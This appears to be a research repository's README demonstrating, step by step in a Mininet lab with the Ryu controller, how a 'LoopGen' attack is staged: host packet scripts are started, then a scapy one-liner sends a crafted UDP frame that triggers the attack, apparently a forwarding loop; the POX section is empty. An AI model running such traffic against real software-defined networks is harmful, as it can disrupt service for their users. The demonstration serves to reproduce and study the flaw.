# Step-by-step Demonstration
content
[Ryu](##Ryu)
[POX](##POX)

## Ryu
First, clean up the remaining useless virtual network environment of Mininet.
```bash
sudo mn -c
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/1.png)

Then, start the controller.
```bash
ryu-manager simple_switch_13.py
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/2.png)

Start mininet topology
```bash
sudo python3 -E LoopGen_topo.py
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/3.png)

Open the hosts' terminal
```bash
mininet> xterm h1 h2 h3
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/4.png)

Next, send packets in each host terminal.
```bash
# Node: h1
python3 LoopGen_packets.py h1-eth0 00:00:00:00:00:02

# Node: h2
python3 LoopGen_packets.py h2-eth0 00:00:00:00:00:03

# Node: h3
python3 LoopGen_packets.py h3-eth0 00:00:00:00:00:01
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/5.png)
The screen of the packets being sent out:
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/7.png)

Finally, trigger the attack and exit the mininet.
```bash
mininet> h1 python3 -c "from scapy.all import sendp, Ether, IP, UDP; sendp(Ether(src='00:00:00:00:00:01', dst='00:00:00:00:00:08')/IP(dst='10.0.0.8')/UDP(dport=9999), iface='h1-eth0', count=1)"
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/8.png)
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/9.png)

## POX
